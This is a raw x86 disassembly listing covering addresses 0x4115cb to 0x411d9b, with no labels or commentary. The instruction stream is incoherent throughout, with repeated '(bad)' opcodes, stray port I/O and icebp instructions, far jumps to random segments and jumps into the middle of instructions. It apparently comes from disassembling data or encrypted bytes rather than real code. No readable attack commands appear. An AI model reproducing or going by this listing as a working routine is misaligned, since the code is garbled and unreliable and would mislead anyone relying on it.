  4115cb:	add    BYTE PTR [eax-0x5859e905],dh
  4115d1:	aaa    
  4115d2:	sub    bl,BYTE PTR [ebx*8+0x445aa139]
  4115d9:	cs dec ecx
  4115db:	pop    ss
  4115dc:	lock pop edi
  4115de:	je     0x41157e
  4115e0:	loopne 0x4115c9
  4115e2:	sub    ebx,DWORD PTR [edi]
  4115e4:	mov    ecx,0xd83688e5
  4115e9:	and    DWORD PTR [ecx],edx
  4115eb:	xlat   BYTE PTR ds:[ebx]
  4115ec:	jmp    0x411593
  4115ee:	test   al,0xb6
  4115f0:	fwait
  4115f1:	xchg   DWORD PTR [esi],ebx
  4115f3:	mov    esp,0x544e9304
  4115f8:	cmp    eax,0x3a5a1b3
  4115fd:	out    dx,eax
  4115fe:	push   0xffffffb5
  411600:	and    esi,esi
  411602:	mov    bh,0x39
  411604:	dec    esi
  411605:	jge    0x411630
  411607:	jno    0x411603
  411609:	into   
  41160a:	adc    BYTE PTR [ebx+edi*2-0x221fc90c],bl
  411611:	faddp  st(1),st
  411613:	mov    edx,0x16377a24
  411618:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  411619:	aas    
  41161a:	ret    
  41161b:	dec    ebx
  41161c:	pop    ecx
  41161d:	push   esp
  41161e:	push   esp
  41161f:	adc    ecx,DWORD PTR [edx-0x25f3019a]
  411625:	jb     0x4115f3
  411627:	mov    ss,ecx
  411629:	(bad)  
  41162a:	mov    eax,0xa9898398
  41162f:	aas    
  411630:	and    ecx,DWORD PTR [eax-0x51357da7]
  411636:	iret   
  411637:	or     al,0x2d
  411639:	dec    ebp
  41163a:	push   esi
  41163b:	or     BYTE PTR ss:[esi+ecx*1-0x192c85a9],bh
  411643:	inc    edx
  411644:	mov    esp,0x13c84ef
  411649:	js     0x4116c8
  41164b:	and    bl,BYTE PTR [eax+ebp*8-0x4df80c39]
  411652:	sub    ebp,DWORD PTR [eax]
  411654:	add    al,0xca
  411656:	fld    QWORD PTR ds:0x6802a7af
  41165c:	jl     0x4116d2
  41165e:	push   edi
  41165f:	sub    bl,0xad
  411662:	sar    BYTE PTR [edi+0x59],1
  411665:	mov    ebp,0x22b062fe
  41166a:	retfw  
  41166c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41166d:	pop    esp
  41166e:	push   ecx
  41166f:	outs   dx,DWORD PTR ds:[esi]
  411670:	popa   
  411671:	fwait
  411672:	mov    ah,0xff
  411674:	mov    al,0x7a
  411676:	inc    edi
  411677:	das    
  411678:	xchg   esi,eax
  411679:	cmp    BYTE PTR [eax-0x30],bh
  41167c:	mov    ebx,0x43783596
  411681:	jbe    0x4116ec
  411683:	or     BYTE PTR [esp+eiz*4],0x4e
  411687:	mov    eax,0xe88347f7
  41168c:	sub    ch,dl
  41168e:	ja     0x4116ea
  411690:	push   0xbf58f552
  411695:	fcmovbe st,st(5)
  411697:	and    BYTE PTR ds:0x22f52568,ch
  41169d:	xor    bl,BYTE PTR [ebx-0x1b]
  4116a0:	mov    dl,0x1a
  4116a2:	ret    
  4116a3:	(bad)  
  4116a4:	in     eax,dx
  4116a5:	add    eax,0xdd53acaf
  4116aa:	gs (bad) 
  4116ac:	aam    0xe1
  4116ae:	push   esp
  4116af:	jecxz  0x411632
  4116b1:	or     ah,dl
  4116b3:	pop    edx
  4116b4:	fisubr WORD PTR ds:0x82d2095e
  4116ba:	push   ecx
  4116bb:	jl     0x41164d
  4116bd:	jg     0x4116b2
  4116bf:	mov    esi,0x5a8f5e92
  4116c4:	xchg   edi,eax
  4116c5:	mov    bl,BYTE PTR [edx+ebp*8-0x4e2d57cd]
  4116cc:	pop    es
  4116cd:	daa    
  4116ce:	add    BYTE PTR [esi-0x369cd307],al
  4116d4:	adc    DWORD PTR [ebp+0x52],0x62
  4116d8:	and    DWORD PTR [ebx-0x1b],eax
  4116db:	inc    esi
  4116dc:	jmp    0x70cffcd3
  4116e1:	hlt    
  4116e2:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4116e3:	mov    ebp,0x1ec55505
  4116e8:	data16 out 0x8f,al
  4116eb:	pop    eax
  4116ec:	push   cs
  4116ed:	arpl   sp,bp
  4116ef:	pusha  
  4116f0:	scas   al,BYTE PTR es:[edi]
  4116f1:	jmp    DWORD PTR [edi+0x48b2896b]
  4116f7:	inc    eax
  4116f8:	inc    esp
  4116f9:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4116fa:	or     edx,DWORD PTR [ebx-0x2c]
  4116fd:	dec    esi
  4116fe:	jo     0x41168c
  411700:	(bad)  
  411701:	in     eax,0x55
  411703:	pop    edi
  411704:	or     edx,edx
  411706:	fnstcw WORD PTR [ecx-0x40]
  411709:	enter  0x4838,0x4a
  41170d:	adc    eax,0x9f54ff3
  411712:	mov    ?,WORD PTR ds:0x52347557
  411718:	inc    esp
  411719:	stos   DWORD PTR es:[edi],eax
  41171a:	icebp  
  41171b:	cld    
  41171c:	pop    ss
  41171d:	icebp  
  41171e:	popa   
  41171f:	fstp   DWORD PTR [eax-0x54]
  411722:	addr16 out dx,al
  411724:	fidiv  WORD PTR [eax]
  411726:	sar    ecx,1
  411728:	popa   
  411729:	xchg   DWORD PTR [ebp+ebp*2-0x76],esp
  41172d:	xchg   ebp,eax
  41172e:	jge    0x4116c9
  411730:	jo     0x411711
  411732:	jl     0x411788
  411734:	jge    0x4116ca
  411736:	jae    0x411730
  411738:	in     al,dx
  411739:	fld    DWORD PTR [edi*2-0x6d50e8e0]
  411740:	test   eax,0xb48a85be
  411745:	xchg   ebx,eax
  411746:	cmp    eax,0x1ead6421
  41174b:	test   DWORD PTR [edi],esi
  41174d:	mov    ecx,0xa5c07803
  411752:	lock test eax,0x6c44e807
  411758:	adc    bl,BYTE PTR [esi+0x28]
  41175b:	inc    edx
  41175c:	push   0xffffff9a
  41175e:	les    ebx,FWORD PTR [edx]
  411760:	push   esp
  411761:	in     eax,dx
  411762:	jmp    0x5a30:0xa2e61e40
  411769:	call   0xbf56:0x7b9d3295
  411770:	cmp    DWORD PTR [eax],edx
  411772:	push   ebp
  411773:	das    
  411774:	jmp    edi
  411776:	iret   
  411777:	pop    ss
  411778:	fadd   QWORD PTR [ebx+0x78]
  41177b:	shl    DWORD PTR [ecx+0x6aacc067],cl
  411781:	add    ecx,eax
  411783:	pop    ss
  411784:	or     al,0x18
  411786:	imul   DWORD PTR [ecx-0x53]
  411789:	add    DWORD PTR [edx+0x472e310c],edx
  41178f:	push   0xffffffcd
  411791:	add    DWORD PTR [eax],ebx
  411793:	stos   DWORD PTR es:[edi],eax
  411794:	mov    edi,0xf53a3f2a
  411799:	retf   
  41179a:	ja     0x41178d
  41179c:	call   0x2b52:0xc5175db5
  4117a3:	(bad)  
  4117a4:	mov    esi,0xbebf6d69
  4117a9:	jo     0x411774
  4117ab:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4117ac:	xchg   DWORD PTR [eax+edx*8],edx
  4117af:	dec    ecx
  4117b0:	and    BYTE PTR [eax],dh
  4117b2:	pop    ebx
  4117b3:	push   0x7dfd226f
  4117b8:	push   esp
  4117b9:	xor    edx,DWORD PTR [esi+0x2d]
  4117bc:	popf   
  4117bd:	mov    bh,0xa0
  4117bf:	aaa    
  4117c0:	mov    eax,ds:0xc619cda7
  4117c5:	push   ss
  4117c6:	ins    BYTE PTR es:[edi],dx
  4117c7:	pop    esi
  4117c8:	ins    BYTE PTR es:[edi],dx
  4117c9:	bound  ebx,QWORD PTR ds:0x1212e3a1
  4117cf:	jo     0x41176d
  4117d1:	aaa    
  4117d2:	outs   dx,BYTE PTR ds:[esi]
  4117d3:	bound  ebp,QWORD PTR [ecx]
  4117d5:	adc    BYTE PTR [eax+0x563653c2],al
  4117db:	retf   
  4117dc:	inc    ebp
  4117dd:	pop    eax
  4117de:	mov    bl,0xab
  4117e0:	add    ebp,esi
  4117e2:	aas    
  4117e3:	es dec edx
  4117e5:	cli    
  4117e6:	mov    al,dh
  4117e8:	sub    eax,0x11aae8ff
  4117ed:	xlat   BYTE PTR ds:[ebx]
  4117ee:	push   esp
  4117ef:	in     eax,dx
  4117f0:	pop    ecx
  4117f1:	ret    0xef58
  4117f4:	jmp    0xbb0582f6
  4117f9:	and    BYTE PTR [edi+0x62],0xda
  4117fd:	ret    0x4efb
  411800:	sahf   
  411801:	sub    esp,ebx
  411803:	or     bl,bh
  411805:	xchg   esi,eax
  411806:	mov    ebx,0x80abcf4c
  41180b:	rcr    DWORD PTR gs:[edi+0x52],1
  41180f:	cli    
  411810:	jecxz  0x4117cc
  411812:	pop    eax
  411813:	pop    ds
  411814:	out    0x30,eax
  411816:	ret    
  411817:	or     esi,esp
  411819:	scas   eax,DWORD PTR es:[edi]
  41181a:	pusha  
  41181b:	pop    esp
  41181c:	call   0xfa16:0xd9be661e
  411823:	ss (bad) 
  411825:	dec    esi
  411826:	leave  
  411827:	mov    ebx,0xf663d800
  41182c:	mov    edi,0x7e6ae42
  411831:	fwait
  411832:	and    eax,0xb4eece83
  411837:	test   eax,0x72370711
  41183c:	mov    dl,0xba
  41183e:	push   ebp
  41183f:	sub    DWORD PTR [edi-0x20facc20],ecx
  411845:	stos   BYTE PTR es:[edi],al
  411846:	cli    
  411847:	jle    0x411850
  411849:	dec    eax
  41184a:	mov    ah,0xdd
  41184c:	int    0xc7
  41184e:	popa   
  41184f:	out    0xc0,al
  411851:	cmp    al,0xc8
  411853:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  411854:	mov    eax,0x1a59cbe7
  411859:	inc    esi
  41185a:	sub    bl,BYTE PTR [eax+0x154ff067]
  411860:	cwde   
  411861:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  411862:	xor    eax,0x62e43815
  411867:	jbe    0x4118de
  411869:	xor    dh,bh
  41186b:	lock jmp 0xbfab:0x3350c438
  411873:	pop    ss
  411874:	mov    ds:0x670a33f3,eax
  411879:	xor    BYTE PTR [ebx+0x46],bl
  41187c:	or     eax,DWORD PTR [eax-0x66]
  41187f:	pop    ss
  411880:	fmul   QWORD PTR [eax+ecx*8+0x61f58bbf]
  411887:	adc    ebp,eax
  411889:	icebp  
  41188a:	lock cmp DWORD PTR [ecx],esi
  41188d:	pop    ebx
  41188e:	les    ecx,FWORD PTR [ebx+0x1e]
  411891:	xlat   BYTE PTR ds:[ebx]
  411892:	jb     0x41187f
  411894:	jns    0x4118e6
  411896:	pop    eax
  411897:	cmp    ebx,edi
  411899:	mov    ch,0xd5
  41189b:	xchg   ebp,eax
  41189c:	sbb    WORD PTR [eax],cx
  41189f:	sbb    ch,dh
  4118a1:	or     ah,dh
  4118a3:	xchg   edx,eax
  4118a4:	add    DWORD PTR [ebx],ecx
  4118a6:	push   edx
  4118a7:	ins    DWORD PTR es:[edi],dx
  4118a8:	add    DWORD PTR [ecx+edi*4],edi
  4118ab:	in     eax,dx
  4118ac:	loop   0x4118af
  4118ae:	das    
  4118af:	fs xchg edx,eax
  4118b1:	or     eax,0xc106130
  4118b6:	jnp    0x41192e
  4118b8:	retf   
  4118b9:	scas   eax,DWORD PTR es:[edi]
  4118ba:	or     dl,BYTE PTR ds:0xe18f274d
  4118c0:	adc    esi,DWORD PTR [ebx-0x4c]
  4118c3:	inc    ecx
  4118c4:	inc    esp
  4118c5:	push   cs
  4118c6:	dec    ebx
  4118c7:	xchg   esi,eax
  4118c8:	xchg   DWORD PTR [edi-0x23225ec6],edx
  4118ce:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4118cf:	push   ds
  4118d0:	mov    al,ds:0xd493b3eb
  4118d5:	fisub  WORD PTR [ecx-0x7d1aa3d5]
  4118db:	retf   
  4118dc:	lahf   
  4118dd:	popa   
  4118de:	adc    dh,BYTE PTR [ebx]
  4118e0:	lods   eax,DWORD PTR ds:[esi]
  4118e1:	sbb    bh,BYTE PTR [eax]
  4118e3:	mov    BYTE PTR [ebx],dh
  4118e5:	inc    al
  4118e7:	ret    
  4118e8:	xchg   ecx,eax
  4118e9:	sub    BYTE PTR [eax+0x15d9b170],cl
  4118ef:	data16 mov BYTE PTR [esi+0xe6c5f4f],dh
  4118f6:	mov    eax,0x487a88aa
  4118fb:	add    DWORD PTR [ecx],esp
  4118fd:	cdq    
  4118fe:	jle    0x41193d
  411900:	arpl   WORD PTR [edi+0x6c],bx
  411903:	mov    dl,0xe7
  411905:	adc    bl,BYTE PTR [edi-0x38]
  411908:	addr16 push edi
  41190a:	jecxz  0x4118c1
  41190c:	xor    al,0xf5
  41190e:	aam    0x31
  411910:	lods   eax,DWORD PTR ds:[esi]
  411911:	cwde   
  411912:	mov    cl,0x2
  411914:	xchg   DWORD PTR [ebx],edi
  411916:	aam    0x1e
  411918:	stc    
  411919:	cs sbb ebx,edx
  41191c:	jns    0x41198e
  41191e:	scas   al,BYTE PTR es:[edi]
  41191f:	jle    0x4118fb
  411921:	sbb    al,0x79
  411923:	loop   0x4118d1
  411925:	in     al,0xb0
  411927:	(bad)  
  411928:	ror    DWORD PTR [eax+0xef85690],1
  41192e:	jne    0x4118b0
  411930:	xor    eax,DWORD PTR [ecx-0x11]
  411933:	jmp    0x38153362
  411938:	mov    BYTE PTR [edi],cl
  41193a:	nop
  41193b:	push   es
  41193c:	loopne 0x4118bf
  41193e:	mov    ebx,0x93fa6d5a
  411943:	popf   
  411944:	xchg   ecx,eax
  411945:	popa   
  411946:	pop    ebx
  411947:	int    0xff
  411949:	inc    ebx
  41194a:	pop    ecx
  41194b:	adc    ch,al
  41194d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41194e:	les    esi,FWORD PTR [edx+0x4ffe0f0c]
  411954:	mov    al,0x71
  411956:	mov    ebx,0x7b3b4afa
  41195b:	repz pop ss
  41195d:	rol    DWORD PTR [ebp-0x60],0x2c
  411961:	lahf   
  411962:	sbb    al,0xd0
  411964:	jp     0x41197f
  411966:	sub    BYTE PTR [esi+0x1d],bl
  411969:	lds    ecx,FWORD PTR ds:0x44203766
  41196f:	mov    eax,ds:0x258cf878
  411974:	inc    BYTE PTR [edx+0x28a9c7d3]
  41197a:	and    al,BYTE PTR [edi-0x4048268c]
  411980:	loop   0x41190d
  411982:	mov    eax,ds:0xb783b691
  411987:	add    BYTE PTR [edi-0x7a],bl
  41198a:	jne    0x41198f
  41198c:	add    DWORD PTR [eax],0xc768d458
  411992:	dec    edi
  411993:	mov    ebx,0x9aee8f3f
  411998:	dec    edx
  411999:	jp     0x411990
  41199b:	clc    
  41199c:	dec    ebp
  41199d:	and    DWORD PTR [ebp+0xb],ebx
  4119a0:	sbb    eax,ecx
  4119a2:	mov    ebx,0xdce81aab
  4119a7:	(bad)  
  4119a8:	cli    
  4119a9:	sbb    dl,cl
  4119ab:	push   ebp
  4119ac:	inc    edx
  4119ad:	pop    ebp
  4119ae:	or     edx,DWORD PTR [ecx-0x235cb76]
  4119b4:	cmc    
  4119b5:	xor    ebx,ebx
  4119b7:	sbb    ch,dl
  4119b9:	enter  0x323e,0x7a
  4119bd:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4119be:	test   eax,0x5213149
  4119c3:	push   edx
  4119c4:	in     al,dx
  4119c5:	push   edi
  4119c6:	retf   0x2d86
  4119c9:	dec    esp
  4119ca:	out    dx,al
  4119cb:	jp     0x41196f
  4119cd:	aam    0xee
  4119cf:	out    0xaa,al
  4119d1:	nop
  4119d2:	adc    dh,BYTE PTR [ebx+0x48]
  4119d5:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4119d6:	jecxz  0x411a0e
  4119d8:	lods   eax,DWORD PTR ds:[esi]
  4119d9:	sbb    ebx,DWORD PTR [eax]
  4119db:	test   al,0x90
  4119dd:	cmp    al,0x9d
  4119df:	mul    BYTE PTR [edi-0x1c]
  4119e2:	mov    ebx,0xcef64f9f
  4119e7:	test   eax,0xff184901
  4119ec:	pop    ebp
  4119ed:	out    0x81,eax
  4119ef:	push   esi
  4119f0:	jno    0x411a1c
  4119f2:	je     0x41199b
  4119f4:	ret    0x6f7d
  4119f7:	and    al,BYTE PTR [esi-0x2]
  4119fa:	xor    bl,BYTE PTR [edi]
  4119fc:	loop   0x411980
  4119fe:	sub    BYTE PTR ds:0x373ec6ec,0x96
  411a05:	xchg   ecx,eax
  411a06:	inc    ecx
  411a07:	sub    DWORD PTR [edx+0x58c60f20],ecx
  411a0d:	stc    
  411a0e:	ds pop ebx
  411a10:	inc    ecx
  411a11:	std    
  411a12:	xor    DWORD PTR [esi],edx
  411a14:	mov    ah,0xe2
  411a16:	int3   
  411a17:	inc    edx
  411a18:	stc    
  411a19:	dec    ebx
  411a1a:	or     eax,0x802f8384
  411a1f:	adc    DWORD PTR [ecx+0x5e5dd79d],edi
  411a25:	gs mov eax,0xfdbfdf20
  411a2b:	mov    esi,0x4ddcb485
  411a30:	(bad)  [eax+0x71bd2cd7]
  411a36:	sahf   
  411a37:	mov    edx,0x32b3effb
  411a3c:	lahf   
  411a3d:	mov    cl,0xb
  411a3f:	ins    BYTE PTR es:[edi],dx
  411a40:	cmc    
  411a41:	adc    BYTE PTR [ecx+0x24bf2bd6],ah
  411a47:	mov    al,0xb9
  411a49:	cld    
  411a4a:	loop   0x411acb
  411a4c:	mov    edx,0x36de7db3
  411a51:	rol    esi,cl
  411a53:	(bad)  
  411a54:	dec    edi
  411a55:	test   BYTE PTR [ebp+0x76],0x4
  411a59:	imul   edx,ecx,0xfffffff7
  411a5c:	rcl    dx,1
  411a5f:	mov    eax,ds:0x5e70e53d
  411a64:	cdq    
  411a65:	mov    eax,ds:0x3dd1becd
  411a6a:	dec    ecx
  411a6b:	cmp    eax,0x276dece8
  411a70:	pop    edx
  411a71:	clc    
  411a72:	dec    ebp
  411a73:	cmp    al,0x1b
  411a75:	call   0xde0c:0x828aff6f
  411a7c:	pop    edx
  411a7d:	jmp    0x411a57
  411a7f:	ins    DWORD PTR es:[edi],dx
  411a80:	ins    DWORD PTR es:[edi],dx
  411a81:	stc    
  411a82:	sbb    DWORD PTR [edx-0x23],ebx
  411a85:	daa    
  411a86:	xchg   BYTE PTR [esi-0x56],dh
  411a89:	xchg   edi,eax
  411a8a:	xchg   esi,eax
  411a8b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  411a8c:	iret   
  411a8d:	and    al,0xb9
  411a8f:	stos   BYTE PTR es:[edi],al
  411a90:	pop    esi
  411a91:	leave  
  411a92:	mov    ebp,0x12668691
  411a97:	test   eax,0x877ce45a
  411a9c:	mov    al,ds:0x170c5a79
  411aa1:	dec    esi
  411aa2:	xor    ch,dl
  411aa4:	xchg   ecx,eax
  411aa5:	arpl   WORD PTR ds:0xa261b1fb,si
  411aab:	adc    eax,0x8f73b24e
  411ab0:	and    DWORD PTR [edi],0xa34004c6
  411ab6:	ins    DWORD PTR es:[edi],dx
  411ab7:	push   DWORD PTR [eax+0x3d835985]
  411abd:	or     BYTE PTR [edi+0x62],ch
  411ac0:	sbb    esp,DWORD PTR [ebx+edi*8-0x40027059]
  411ac7:	adc    eax,DWORD PTR [esi+0xf]
  411aca:	fld    DWORD PTR ds:0x71cb7ed4
  411ad0:	test   al,0x87
  411ad2:	js     0x411ab1
  411ad4:	test   BYTE PTR [esi-0x414005f6],bh
  411ada:	(bad)  
  411adb:	shl    BYTE PTR [eax-0xcd26558],cl
  411ae1:	(bad)  
  411ae2:	imul   ecx,DWORD PTR [ebx],0x34
  411ae5:	loop   0x411a75
  411ae7:	inc    edi
  411ae8:	arpl   WORD PTR [ebx],sp
  411aea:	shr    BYTE PTR [ebp-0x4b],1
  411aed:	dec    ebp
  411aee:	ret    0x8318
  411af1:	hlt    
  411af2:	jl     0x411acd
  411af4:	stc    
  411af5:	mov    al,BYTE PTR [esi]
  411af7:	sbb    eax,0x67cfd95c
  411afc:	in     al,0x1a
  411afe:	sub    eax,0x72a44b1a
  411b03:	mov    BYTE PTR [esi-0x5c],ch
  411b06:	repz jb 0x411aa1
  411b09:	pop    ds
  411b0a:	outs   dx,DWORD PTR ds:[esi]
  411b0b:	mov    ebp,ebx
  411b0d:	rol    BYTE PTR [eax-0x12],cl
  411b10:	jecxz  0x411ab1
  411b12:	(bad)  
  411b13:	fadd   DWORD PTR [ebx-0x59]
  411b16:	out    dx,al
  411b17:	sbb    DWORD PTR [edi+ebx*4+0xb56c020],0x57
  411b1f:	neg    BYTE PTR [esi-0x4dbce2be]
  411b25:	imul   ebx,DWORD PTR [ecx],0x930c0e84
  411b2b:	jmp    0x411abb
  411b2d:	inc    esp
  411b2e:	inc    esi
  411b2f:	pop    ds
  411b30:	ss cmc 
  411b32:	ds dec edi
  411b34:	mov    eax,ds:0x440ea249
  411b39:	add    BYTE PTR [esi-0x7ec1aca7],ch
  411b3f:	cs inc ecx
  411b41:	int    0xe0
  411b43:	add    ebx,ebp
  411b45:	stos   DWORD PTR es:[edi],eax
  411b46:	xor    DWORD PTR [ecx],0xfffffff4
  411b49:	sub    bl,dh
  411b4b:	xchg   ecx,eax
  411b4c:	pop    es
  411b4d:	pusha  
  411b4e:	sbb    eax,0xd7d6c974
  411b53:	iret   
  411b54:	enter  0x8120,0x63
  411b58:	nop
  411b59:	jmp    0xbb9e:0xb1b4c7
  411b60:	fimul  WORD PTR [ebx+0xc]
  411b63:	mov    dh,0x78
  411b65:	xchg   DWORD PTR [eax-0x160fdb2a],ecx
  411b6b:	cmp    al,0x5b
  411b6d:	push   ss
  411b6e:	inc    edx
  411b6f:	xor    BYTE PTR [ecx],bl
  411b71:	pop    esi
  411b72:	sbb    ebx,DWORD PTR [ebp+esi*2+0x5dc8793c]
  411b79:	mov    dh,0x18
  411b7b:	sub    edx,DWORD PTR [esi]
  411b7d:	(bad)  
  411b7e:	bound  edx,QWORD PTR [ecx+0x67]
  411b81:	xchg   esp,eax
  411b82:	sbb    DWORD PTR [edi],0x39
  411b85:	xchg   esi,eax
  411b86:	or     dh,BYTE PTR [edi]
  411b88:	mov    bl,0xdb
  411b8a:	int3   
  411b8b:	jne    0x411b6f
  411b8d:	xchg   edi,eax
  411b8e:	push   esp
  411b8f:	test   BYTE PTR [edx],bl
  411b91:	test   eax,0xf303794d
  411b96:	out    0x23,al
  411b98:	mov    eax,ds:0xe53474f1
  411b9d:	jnp    0x411b32
  411b9f:	shl    DWORD PTR [esi+0x6baeffa],0xea
  411ba6:	xchg   ebx,eax
  411ba7:	push   0xed132bc6
  411bac:	mov    eax,0x52511b59
  411bb1:	xchg   edx,eax
  411bb2:	or     al,0xe5
  411bb4:	dec    eax
  411bb5:	pop    eax
  411bb6:	add    eax,0xa2297b03
  411bbb:	mov    ch,0x8e
  411bbd:	pop    ebx
  411bbe:	mov    eax,eax
  411bc0:	push   cs
  411bc1:	sar    bl,0xe2
  411bc4:	dec    eax
  411bc5:	inc    ecx
  411bc6:	jle    0x411bfb
  411bc8:	in     eax,0x14
  411bca:	test   DWORD PTR [edi+esi*1+0x224d9b93],ebp
  411bd1:	stos   DWORD PTR es:[edi],eax
  411bd2:	mov    ebx,0x79b41d5
  411bd7:	mov    al,ds:0xcc3832b4
  411bdc:	pop    DWORD PTR [edi]
  411bde:	aaa    
  411bdf:	pmullw mm1,mm7
  411be2:	cld    
  411be3:	mov    ecx,0x9bdc2057
  411be8:	out    0xf7,eax
  411bea:	test   al,0x7b
  411bec:	les    esi,FWORD PTR [eax-0x520a6e8c]
  411bf2:	mov    al,0x3b
  411bf4:	cdq    
  411bf5:	mov    esi,0x51d3357e
  411bfa:	pop    esi
  411bfb:	or     al,0xc0
  411bfd:	gs cmp eax,0xf270eff4
  411c03:	sub    bh,dl
  411c05:	push   ss
  411c06:	mov    dh,0x1a
  411c08:	cli    
  411c09:	mov    ebx,0x659286bf
  411c0e:	xchg   ebp,eax
  411c0f:	push   es
  411c10:	or     DWORD PTR cs:[ecx+0x5d],ebx
  411c14:	inc    edx
  411c15:	out    0x69,al
  411c17:	push   es
  411c18:	test   BYTE PTR [esi+0x5d],dl
  411c1b:	fs xchg edi,eax
  411c1d:	cwde   
  411c1e:	jmp    0x4afc:0xcb1cf0d
  411c25:	pop    es
  411c26:	aaa    
  411c27:	pop    ss
  411c28:	push   esp
  411c29:	mov    al,0xda
  411c2b:	bound  eax,QWORD PTR [edi+ecx*8-0x19]
  411c2f:	cmp    eax,DWORD PTR [eax+0x30]
  411c32:	and    al,0xa0
  411c34:	or     BYTE PTR [eax+0x6bcba2b2],al
  411c3a:	cwde   
  411c3b:	xchg   DWORD PTR [eax-0x2e],esi
  411c3e:	loopne 0x411c0c
  411c40:	pop    ebx
  411c41:	scas   eax,DWORD PTR es:[edi]
  411c42:	leave  
  411c43:	dec    esi
  411c44:	or     DWORD PTR ds:0xdb765b70,ebx
  411c4a:	into   
  411c4b:	retf   
  411c4c:	dec    ecx
  411c4d:	xor    al,0x7
  411c4f:	push   eax
  411c50:	cmc    
  411c51:	cmc    
  411c52:	and    al,0xd4
  411c54:	outs   dx,DWORD PTR ds:[esi]
  411c55:	push   0x3d
  411c57:	mov    ds:0xe1da0683,eax
  411c5c:	inc    ecx
  411c5d:	mov    ecx,0x1903be3d
  411c62:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  411c63:	ds out dx,al
  411c65:	lea    esi,[esi]
  411c67:	push   esp
  411c68:	hlt    
  411c69:	retf   
  411c6a:	push   0x0
  411c6c:	adc    dh,cl
  411c6e:	adc    DWORD PTR [edi+eiz*4+0x6b],0xe1c1cbb2
  411c76:	sbb    dl,al
  411c78:	sbb    eax,0xa72c3cd2
  411c7d:	out    dx,al
  411c7e:	and    BYTE PTR [esi+0x50646b43],0xcc
  411c85:	and    al,0xb1
  411c87:	jne    0x411cbb
  411c89:	pushw  cs
  411c8b:	in     eax,0xdb
  411c8d:	cmp    BYTE PTR [eax+0x214f6a8],bl
  411c93:	jbe    0x411c18
  411c95:	aaa    
  411c96:	inc    edi
  411c97:	pop    edx
  411c98:	rep movs BYTE PTR es:[edi],BYTE PTR ds:[esi]
  411c9a:	rcl    dh,1
  411c9c:	dec    edi
  411c9d:	mov    edi,0xb9294db2
  411ca2:	push   cs
  411ca3:	xchg   edx,eax
  411ca4:	jg     0x411c8a
  411ca6:	ins    BYTE PTR es:[edi],dx
  411ca7:	mov    dl,BYTE PTR [eax-0x37]
  411caa:	and    eax,0xb0906e9a
  411caf:	jecxz  0x411ced
  411cb1:	fisub  DWORD PTR [eax+0x7f]
  411cb4:	movzx  ecx,WORD PTR [edi]
  411cb7:	leave  
  411cb8:	inc    esp
  411cb9:	mov    ds:0x14cbdbd1,al
  411cbe:	(bad)  
  411cbf:	push   esp
  411cc0:	aad    0x4e
  411cc2:	shr    BYTE PTR [ebx-0x75dbaec4],1
  411cc8:	pop    edi
  411cc9:	add    esp,DWORD PTR [edi+0x73]
  411ccc:	mov    al,ds:0xfe251895
  411cd1:	pop    ebx
  411cd2:	inc    eax
  411cd3:	sub    ecx,0x68
  411cd6:	xchg   edx,eax
  411cd7:	mov    bl,0xe1
  411cd9:	pop    ss
  411cda:	or     al,0x95
  411cdc:	mov    dh,0xfb
  411cde:	jecxz  0x411cd1
  411ce0:	mov    al,ds:0xcb225b31
  411ce5:	xchg   dx,ax
  411ce7:	or     BYTE PTR fs:[ecx+0x181afc74],al
  411cee:	lock mov ebp,esi
  411cf1:	enter  0x92e8,0xc3
  411cf5:	sbb    eax,0x7e8f3656
  411cfa:	mov    eax,0x47af401f
  411cff:	daa    
  411d00:	pushf  
  411d01:	mov    edx,DWORD PTR [esp+esi*1]
  411d04:	lods   eax,DWORD PTR ds:[esi]
  411d05:	(bad)
  411d09:	scas   al,BYTE PTR es:[edi]
  411d0a:	jg     0x411d25
  411d0c:	addr16 aam 0xcf
  411d0f:	ror    BYTE PTR [ecx],1
  411d11:	iret   
  411d12:	addr16 jae 0x411d4e
  411d15:	imul   esi,DWORD PTR [ebx-0x11c94dd0],0x752ba26a
  411d1f:	sar    ch,cl
  411d21:	mov    dl,dl
  411d23:	mov    al,0x25
  411d25:	mov    DWORD PTR [esi],edx
  411d27:	cmp    ecx,DWORD PTR [edx-0x50f5fa0]
  411d2d:	inc    esp
  411d2e:	jl     0x411d9c
  411d30:	inc    ecx
  411d31:	arpl   WORD PTR [edi+edi*8+0x36],dx
  411d35:	out    0xc0,al
  411d37:	aas    
  411d38:	and    al,0x12
  411d3a:	push   es
  411d3b:	fwait
  411d3c:	test   DWORD PTR ds:0x79bba4e2,0xa2ba5688
  411d46:	pop    eax
  411d47:	push   cs
  411d48:	outs   dx,DWORD PTR ds:[esi]
  411d49:	int3   
  411d4a:	sbb    eax,0x152987bb
  411d4f:	icebp  
  411d50:	sub    dh,BYTE PTR [esi]
  411d52:	outs   dx,BYTE PTR ds:[esi]
  411d53:	bswap  ebx
  411d55:	imul   eax,DWORD PTR [ecx+edx*2-0x14],0x3
  411d5a:	mov    ecx,0x6c3c9280
  411d5f:	dec    edi
  411d60:	add    eax,0xa5ffd471
  411d65:	mov    cl,0x42
  411d67:	ret    
  411d68:	aad    0x9a
  411d6a:	imul   eax,DWORD PTR [ecx+0x4d156ecd],0xfffffff4
  411d71:	adc    BYTE PTR [edi+0x56],0x12
  411d75:	loop   0x411db7
  411d77:	push   0xa012ea1
  411d7c:	add    al,0x46
  411d7e:	adc    eax,0xd06beb82
  411d83:	mov    esi,0x63e6e10c
  411d88:	cmp    al,BYTE PTR [ecx]
  411d8a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  411d8b:	shrd   esi,ecx,cl
  411d8e:	popf   
  411d8f:	cs push 0xb1220aef
  411d95:	ret    
  411d96:	bound  esp,QWORD PTR [ebx-0x79]
  411d99:	inc    edi
  411d9a:	pop    ds
  411d9b:	inc    esi
